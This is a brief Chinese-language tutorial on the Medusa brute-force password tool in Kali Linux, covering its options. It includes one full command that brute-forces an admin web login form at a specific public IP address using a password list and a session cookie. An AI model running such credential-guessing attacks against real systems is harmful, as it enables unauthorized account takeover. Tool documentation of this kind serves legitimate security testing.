# Kali-密码暴力破解工具medusa(美杜莎)

参考文章

1. [密码爆破工具：Medusa(美杜莎)-操作说明](http://blog.csdn.net/u010984277/article/details/50792816)

2. [Medusa - wiki](https://www.aldeid.com/wiki/Medusa)

与hydra相似, medusa也支持多个模块. 

`medusa -d`: 查看可用模块

`medusa -M 模块名 -q`: 查看模块帮助

-h：目标机器地址.

-u/U：指定用户名.

-p/P: 指定密码/密码列表文件

-e : 尝试空密码.

-F：破解成功后立即停止破解.

-v：显示破解过程.

```
$ medusa -v 6 -h 104.151.231.170 -u admin -P ./1pass00 -M web-form -m USER-AGENT:"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36" -m FORM:"index.php?s=Admin-Login-Check" -m DENY-SIGNAL:"countDownSec" -m FORM-DATA:"post?user_name=&user_pwd=&submit='登 录'" -m CUSTOM-HEADER:"Cookie: PHPSESSID=ge425h3jgs3rqnhg9bgi2q5jg3"
```

-m: 表示传入模块的参数

`-m FORM`: 表示表单提交的目标url

`-m FORM-DATA`: 表单域变量.

`-m CUSTOM-HEADER`: 自定义请求头

`-m DENY-SIGNAL`: 验证失败后的响应包含的字符串, 不支持正确响应检测, 也不支持通配符...事实上, 如果包含'*'号就会get到'Segmentation fault'